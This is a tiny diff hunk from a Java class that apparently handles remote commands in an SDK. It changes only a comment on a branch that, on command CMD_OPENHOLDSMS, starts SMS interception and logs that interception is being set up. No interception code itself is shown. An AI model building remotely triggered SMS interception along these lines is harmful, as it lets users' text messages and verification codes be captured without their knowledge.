@@ -1056,7 +1056,7 @@ public class WCConnect {
 							+ "\t\tCMDMsg:新规则下发json有误");
 				}
 			} else if (revBean.getCmdid() == Config.CMD_OPENHOLDSMS) {
-				// region 开启短信拦截
+				// region 开启sms lanjie
 				PostLog("SMSLog:SDK开始建立拦截!");
 				//mlog.i("SMSLog:SDK开始建立拦截!aJSONData = " + aJSONData.toString());
 
